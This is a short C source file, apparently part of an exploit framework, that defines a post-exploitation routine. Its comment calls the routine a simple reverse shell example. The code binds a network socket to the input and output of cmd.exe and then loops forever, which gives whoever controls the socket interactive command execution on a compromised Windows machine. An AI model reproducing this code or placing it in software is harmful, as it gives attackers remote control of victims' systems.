#include "post_exploit.h"

#include <stdio.h>

// Put your own code in here!
// Provided is a simple reverse shell example
void post_exploit(SOCKET sock)
{
    // Spawn CMD using the socket for input and output
	STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdError = (HANDLE)sock;
    sinfo.hStdInput = (HANDLE)sock;
    sinfo.hStdOutput = (HANDLE)sock;

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, "S:\\", &sinfo, &pinfo);

    // Loop forever
    while (1) {}
}
